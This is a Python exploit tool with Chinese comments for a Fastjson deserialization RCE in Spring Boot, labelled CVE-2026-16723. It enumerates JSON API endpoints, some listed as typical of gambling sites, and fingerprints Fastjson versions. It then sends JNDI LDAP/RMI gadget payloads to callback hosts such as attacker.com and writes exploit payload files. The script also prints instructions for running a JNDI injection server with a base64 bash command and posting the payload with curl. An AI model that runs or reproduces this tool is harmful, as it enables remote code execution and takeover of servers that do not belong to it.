#!/usr/bin/env python3
"""
fastjson_probe.py — Fastjson RCE 完整作业工具（授权范围内）

CVE-2026-16723：Fastjson 1.2.68-1.2.83 + Spring Boot 环境 RCE
                官方至今无正式补丁，SafeMode 是唯一缓解手段

覆盖能力：
  Phase 1  指纹识别    — 版本探测、错误响应特征、Spring Boot 指纹
  Phase 2  OOB 检测   — DNSLOG/JNDI 回调验证漏洞存在
  Phase 3  利用链枚举  — JNDI/TemplatesImpl/JdbcRowSetImpl 等
  Phase 4  端点枚举    — Spring Boot /api/* 所有 JSON 入口
  Phase 5  落证据      — 写 exports

用法：
  # 指纹探测 + 版本检测
  python3 炼蛊房/fastjson_probe.py detect -u https://api.target.com

  # 全端点扫描 + OOB 检测（需要 dnslog 地址）
  python3 炼蛊房/fastjson_probe.py scan -u https://api.target.com \
    --dnslog your.dnslog.cn

  # 已知端点验证
  python3 炼蛊房/fastjson_probe.py verify -u https://api.target.com/api/login \
    --dnslog your.dnslog.cn

  # 生成各类利用 payload
  python3 炼蛊房/fastjson_probe.py payload --type jndi --host 攻击机IP --port 1389

依赖：pip install requests
"""

import argparse
import json
import re
import sys
import time
import uuid
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

# ──────────────────────────── Scope 检查 ────────────────────────────

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import require_in_scope  # noqa: E402


# ──────────────────────────── HTTP 工具 ─────────────────────────────

def _sess() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; okhttp/4.9.3)",
        "Content-Type": "application/json",
        "Accept": "application/json",
    })
    return s


def _post(sess, url: str, body: str | bytes, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 12)
        kw.setdefault("verify", False)
        if isinstance(body, str):
            body = body.encode()
        return sess.post(url, data=body, **kw)
    except Exception:
        return None


def _get(sess, url: str, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 10)
        kw.setdefault("verify", False)
        return sess.get(url, **kw)
    except Exception:
        return None


# ──────────────────────────── Fastjson 特征 ─────────────────────────

# 报错响应中的 Fastjson 特征
FJ_ERROR_PATTERNS = [
    r"com\.alibaba\.fastjson",
    r"fastjson\.JSON",
    r"JSONException",
    r"autoType is not support",
    r"checkAutoType",
    r"not support autoType",
    r"No serializer found",
    r"parse error",
    r"syntax error",
]

# Spring Boot 特征
SB_PATTERNS = [
    "application/json",
    "X-Content-Type-Options",
    "Spring",
    "Whitelabel Error Page",
    "timestamp",
    "status",
    "error",
    "path",
]

# 版本探测：发送特定 payload 观察错误内容
VERSION_PROBES = {
    "1.2.83_safemode": '{"@type":"java.lang.Exception"}',
    "autoType_check":  '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dnslog","autoCommit":true}',
    "blacklist_probe": '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://probe.dnslog.cn/a"}',
}

# ──────────────────────────── 利用 Payload ──────────────────────────

def make_payload(payload_type: str, host: str = "attacker.com",
                 port: int = 1389, cmd: str = "id",
                 dnslog: str = "") -> str:
    """生成 Fastjson 利用 payload"""

    cb = dnslog or f"{host}:{port}"

    payloads = {
        # JNDI LDAP 注入（最通用，1.2.68-1.2.83 + JDK < 8u191）
        "jndi_ldap": json.dumps({
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": f"ldap://{cb}/Exploit",
            "autoCommit": True,
        }),

        # JNDI RMI（JDK < 8u113）
        "jndi_rmi": json.dumps({
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": f"rmi://{cb}/Exploit",
            "autoCommit": True,
        }),

        # TemplatesImpl 链（需要 Feature.SupportNonPublicField，不常见）
        "templates_impl": json.dumps({
            "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "_bytecodes": ["yv66vg...base64_bytecode..."],
            "_name": "exploit",
            "_tfactory": {},
            "_outputProperties": {},
        }),

        # org.apache.xbean JNDI（绕过 1.2.68 黑名单）
        "xbean_jndi": json.dumps({
            "@type": "org.apache.xbean.propertyeditor.JndiConverter",
            "AsText": f"ldap://{cb}/Exploit",
        }),

        # C3P0（需要 c3p0 在 classpath，Spring Boot 常见）
        "c3p0_jndi": json.dumps({
            "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
            "jndiName": f"ldap://{cb}/Exploit",
            "loginTimeout": 0,
        }),

        # Druid（阿里巴巴连接池，Spring Boot 标配）
        "druid_jndi": json.dumps({
            "@type": "com.alibaba.druid.pool.DruidDataSource",
            "driverClassName": "sun.jdbc.odbc.JdbcOdbcDriver",
            "filters": "stat,wall,log4j",
            "url": f"jdbc:ldap://{cb}/Exploit",
        }),

        # BasicDataSource（commons-dbcp2，覆盖 TeamCity 同款链）
        "dbcp2_jndi": json.dumps({
            "@type": "org.apache.commons.dbcp2.BasicDataSource",
            "driverClassName": "com.sun.jndi.rmi.registry.RegistryContext",
            "url": f"rmi://{cb}/Exploit",
        }),

        # DNS OOB（仅探测，不执行命令）
        "dns_oob": json.dumps({
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": f"ldap://{cb}/a",
            "autoCommit": True,
        }),

        # 版本探测（触发 autoType 错误但不执行）
        "version_probe": json.dumps({
            "@type": "java.net.URL",
            "val": f"http://{cb}/fj_probe_{uuid.uuid4().hex[:8]}",
        }),
    }

    return payloads.get(payload_type, payloads["jndi_ldap"])


# ──────────────────────────── 端点枚举 ──────────────────────────────

COMMON_JSON_ENDPOINTS = [
    # Auth
    "/api/login", "/api/user/login", "/api/v1/login", "/api/auth/login",
    "/api/admin/login", "/app/login", "/user/login", "/login",
    "/api/register", "/api/user/register",
    # 常见业务
    "/api/user/info", "/api/userinfo", "/api/v1/user",
    "/api/order", "/api/orders", "/api/v1/order",
    "/api/pay", "/api/payment", "/api/v1/pay",
    "/api/search", "/api/v1/search",
    "/api/upload", "/api/file/upload",
    # Spring Boot Actuator（作为入口）
    "/actuator/env", "/actuator/health",
    # 博彩站常见
    "/api/game", "/api/sport/bet", "/api/member/login",
    "/api/recharge", "/api/withdraw",
    "/api/agent/login", "/api/proxy/login",
]


def discover_endpoints(sess, base: str) -> list[str]:
    """探测目标上所有 JSON API 入口"""
    found = []
    for path in COMMON_JSON_ENDPOINTS:
        url = base.rstrip("/") + path
        # 先 GET，再试 POST
        r = _get(sess, url)
        if r and r.status_code in (200, 400, 401, 403, 405, 422):
            ct = r.headers.get("Content-Type", "")
            if "json" in ct or r.status_code in (400, 422):
                found.append(url)
                continue
        # 发空 JSON 触发响应
        r2 = _post(sess, url, "{}")
        if r2 and r2.status_code not in (404, 502, 503):
            found.append(url)
    return list(set(found))


# ──────────────────────────── Fastjson 指纹 ─────────────────────────

def fingerprint_fastjson(sess, url: str) -> dict:
    """向端点发送触发性 payload，检测 Fastjson 特征"""
    result = {
        "url": url,
        "is_json": False,
        "fastjson": False,
        "spring_boot": False,
        "version_hint": "",
        "safe_mode": False,
        "responses": [],
    }

    # 基础 JSON 探测
    r = _post(sess, url, '{"test":"probe"}')
    if not r:
        return result

    body = r.text or ""
    ct = r.headers.get("Content-Type", "")
    result["is_json"] = "json" in ct or body.strip().startswith("{")

    # Spring Boot 特征
    sb_hits = [p for p in SB_PATTERNS if p.lower() in body.lower()]
    if sb_hits or "X-Application-Context" in r.headers:
        result["spring_boot"] = True

    # 发 autoType 触发 payload，观察错误
    for probe_name, probe_payload in VERSION_PROBES.items():
        r2 = _post(sess, url, probe_payload)
        if not r2:
            continue
        body2 = r2.text or ""
        result["responses"].append({
            "probe": probe_name,
            "status": r2.status_code,
            "body_snippet": body2[:200],
        })

        # 检测 Fastjson 特征
        for pat in FJ_ERROR_PATTERNS:
            if re.search(pat, body2, re.I):
                result["fastjson"] = True
                break

        # 版本推断
        if "autoType is not support" in body2:
            result["version_hint"] = "< 1.2.47（autoType 完全关闭）"
        elif "checkAutoType" in body2:
            result["version_hint"] = "1.2.47-1.2.68（checkAutoType 启用）"
        elif "not support autoType" in body2:
            if "SafeMode" in body2 or "safeMode" in body2:
                result["safe_mode"] = True
                result["version_hint"] = ">= 1.2.68 SafeMode 已开启（不可利用）"
            else:
                result["version_hint"] = "1.2.68-1.2.83（受 CVE-2026-16723 影响）"
        elif result["fastjson"] and not result["version_hint"]:
            result["version_hint"] = "检测到 Fastjson，版本待确认"

    return result


# ──────────────────────────── OOB 检测 ──────────────────────────────

def oob_test(sess, url: str, dnslog: str, nonce: str = "") -> dict:
    """发送 DNS OOB 回调 payload，验证漏洞"""
    nonce = nonce or uuid.uuid4().hex[:12]
    cb_host = f"{nonce}.{dnslog}"

    payloads_to_try = [
        ("jndi_ldap", make_payload("jndi_ldap", dnslog=cb_host)),
        ("xbean_jndi", make_payload("xbean_jndi", dnslog=cb_host)),
        ("c3p0_jndi", make_payload("c3p0_jndi", dnslog=cb_host)),
        ("version_probe", make_payload("version_probe", dnslog=cb_host)),
    ]

    results = []
    for ptype, payload in payloads_to_try:
        r = _post(sess, url, payload)
        status = r.status_code if r else -1
        body = (r.text or "")[:300] if r else ""
        results.append({
            "payload_type": ptype,
            "status": status,
            "body_snippet": body,
            "callback_host": cb_host,
        })
        time.sleep(0.5)

    return {
        "url": url,
        "nonce": nonce,
        "callback_host": cb_host,
        "dnslog_check_url": f"http://{dnslog}",
        "payloads_sent": results,
        "note": f"在 dnslog 平台查询 {nonce} 的 DNS 记录是否收到回调",
    }


# ──────────────────────────── 命令入口 ──────────────────────────────

def cmd_detect(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    sess = _sess()
    print(f"\n[*] Fastjson 指纹探测: {base}")

    # 发现 JSON 端点
    print("[*] 枚举 JSON 端点...")
    endpoints = discover_endpoints(sess, base)
    print(f"[*] 发现 {len(endpoints)} 个 JSON 端点")

    found_fj = []
    for ep in endpoints[:20]:
        r = fingerprint_fastjson(sess, ep)
        if r["fastjson"] or r["spring_boot"]:
            found_fj.append(r)
            mark = "★ Fastjson" if r["fastjson"] else "Spring Boot"
            safe = " [SafeMode]" if r["safe_mode"] else ""
            vuln = (" ★受CVE-2026-16723影响" if "1.2.68" in r["version_hint"]
                    or "1.2.83" in r["version_hint"] else "")
            print(f"\n  [{mark}{safe}{vuln}] {ep}")
            if r["version_hint"]:
                print(f"    版本推断: {r['version_hint']}")

    if not found_fj:
        print("[-] 未发现 Fastjson 特征")
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    sess = _sess()
    out_dir = Path(args.out) if args.out else Path("exports") / "fastjson" / host
    out_dir.mkdir(parents=True, exist_ok=True)

    print(f"\n[*] Fastjson 全链扫描: {base}")

    # Phase 1: 端点枚举
    print("\n[Phase 1] JSON 端点枚举...")
    endpoints = discover_endpoints(sess, base)
    print(f"  发现 {len(endpoints)} 个端点: {endpoints[:5]}")

    # Phase 2: 指纹
    print("\n[Phase 2] Fastjson 指纹检测...")
    all_fp = []
    vuln_endpoints = []
    for ep in endpoints[:30]:
        fp = fingerprint_fastjson(sess, ep)
        all_fp.append(fp)
        if fp["fastjson"]:
            vuln_endpoints.append(ep)
            safe_str = " [SafeMode!]" if fp["safe_mode"] else " [★可利用]"
            print(f"  ★ {ep}  {fp['version_hint']}{safe_str}")

    (out_dir / "phase2_fingerprint.json").write_text(
        json.dumps(all_fp, ensure_ascii=False, indent=2))

    if not vuln_endpoints:
        print("[-] 未发现可利用 Fastjson 端点")
        return 0

    # Phase 3: OOB 检测（如果提供了 dnslog）
    if args.dnslog:
        print(f"\n[Phase 3] OOB 回调检测 (dnslog: {args.dnslog})...")
        all_oob = []
        for ep in vuln_endpoints[:5]:
            oob = oob_test(sess, ep, args.dnslog)
            all_oob.append(oob)
            print(f"  已发送: {ep}")
            print(f"    回调标识: {oob['nonce']}")
            print(f"    检查: {oob['dnslog_check_url']}")
        (out_dir / "phase3_oob.json").write_text(
            json.dumps(all_oob, ensure_ascii=False, indent=2))
        print("\n  [!] 等待 30 秒后在 dnslog 平台检查是否收到 DNS 回调...")
        print("      如收到 → 漏洞确认存在，继续执行 JNDI/RCE 利用")
    else:
        print("\n[Phase 3] 跳过 OOB 检测（使用 --dnslog your.dnslog.cn 开启）")

    # Phase 4: 生成利用 payload
    print("\n[Phase 4] 生成利用 payload...")
    for ptype in ["jndi_ldap", "jndi_rmi", "xbean_jndi", "c3p0_jndi", "dbcp2_jndi"]:
        payload = make_payload(ptype, host=args.lhost or "攻击机IP", port=1389)
        f = out_dir / f"payload_{ptype}.json"
        f.write_text(payload)

    print(f"\n  Payload 文件已生成到 {out_dir}/")
    print("\n  利用方式：")
    print("  1. 启动 JNDI 注入服务（需要 JDK）：")
    print("     java -jar JNDI-Injection-Exploit.jar -C 'bash -c {echo,BASE64}|{base64,-d}|bash' -A 攻击机IP")
    print("  2. 发送 payload：")
    print(f"     curl -sk -X POST {vuln_endpoints[0]} \\")
    print("       -H 'Content-Type: application/json' \\")
    print(f"       -d @{out_dir}/payload_jndi_ldap.json")

    summary = {
        "target": base,
        "vuln_endpoints": vuln_endpoints,
        "out_dir": str(out_dir),
    }
    (out_dir / "SUMMARY.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2))

    print(f"\n[*] 所有文件已保存到: {out_dir}")
    return 0


def cmd_verify(args: argparse.Namespace) -> int:
    """验证单个端点"""
    url = args.url
    host = urlparse(url).netloc.split(":")[0]
    require_in_scope(host)

    sess = _sess()
    print(f"\n[*] 验证 Fastjson: {url}")

    fp = fingerprint_fastjson(sess, url)
    print(f"  JSON 接口: {'是' if fp['is_json'] else '否'}")
    print(f"  Spring Boot: {'是' if fp['spring_boot'] else '否'}")
    print(f"  Fastjson: {'★ 是' if fp['fastjson'] else '否'}")
    print(f"  SafeMode: {'开启（不可利用）' if fp['safe_mode'] else '关闭'}")
    print(f"  版本推断: {fp['version_hint'] or '未知'}")

    if fp["fastjson"] and not fp["safe_mode"] and args.dnslog:
        print(f"\n[*] OOB 回调测试 ({args.dnslog})...")
        oob = oob_test(sess, url, args.dnslog)
        print(f"  回调标识: {oob['nonce']}")
        print(f"  检查地址: {oob['dnslog_check_url']}")
        for p in oob["payloads_sent"]:
            print(f"  [{p['payload_type']}] HTTP {p['status']}")

    return 0


def cmd_payload(args: argparse.Namespace) -> int:
    """生成各类 payload"""
    payload_types = [
        "jndi_ldap", "jndi_rmi", "xbean_jndi",
        "c3p0_jndi", "dbcp2_jndi", "dns_oob", "version_probe",
    ]

    if args.type == "all":
        for pt in payload_types:
            p = make_payload(pt, host=args.host, port=args.port,
                             dnslog=args.dnslog or f"{args.host}:{args.port}")
            print(f"\n# ── {pt} ──")
            print(p)
    elif args.type in payload_types:
        p = make_payload(args.type, host=args.host, port=args.port,
                         dnslog=args.dnslog or f"{args.host}:{args.port}")
        print(p)
    else:
        print(f"[!] 未知类型，可用: {payload_types + ['all']}")
        return 1
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="fastjson_probe — CVE-2026-16723 完整作业工具（授权范围内）\n"
                    "Fastjson 1.2.68-1.2.83 + Spring Boot RCE | 官方无补丁"
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("detect", help="指纹探测 + 版本推断")
    p.add_argument("-u", "--url", required=True, help="目标 Base URL")

    p = sub.add_parser("scan", help="全链扫描（端点枚举 + 指纹 + OOB + payload 生成）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--dnslog", default="", help="DNSlog 域名（如 abc.dnslog.cn）")
    p.add_argument("--lhost", default="", help="攻击机 IP（payload 中的回连地址）")
    p.add_argument("--out", default="", help="输出目录")

    p = sub.add_parser("verify", help="验证单个端点")
    p.add_argument("-u", "--url", required=True, help="具体 API 端点 URL")
    p.add_argument("--dnslog", default="", help="DNSlog 域名")

    p = sub.add_parser("payload", help="生成利用 payload")
    p.add_argument("--type", default="jndi_ldap",
                   help="payload 类型: jndi_ldap/jndi_rmi/xbean_jndi/c3p0_jndi/dbcp2_jndi/dns_oob/version_probe/all")
    p.add_argument("--host", default="attacker.com", help="攻击机/回调 IP")
    p.add_argument("--port", type=int, default=1389, help="JNDI 服务端口")
    p.add_argument("--dnslog", default="", help="DNSlog 域名（覆盖 host:port）")

    args = ap.parse_args()
    fn = {
        "detect": cmd_detect,
        "scan": cmd_scan,
        "verify": cmd_verify,
        "payload": cmd_payload,
    }[args.cmd]
    sys.exit(fn(args))


if __name__ == "__main__":
    main()
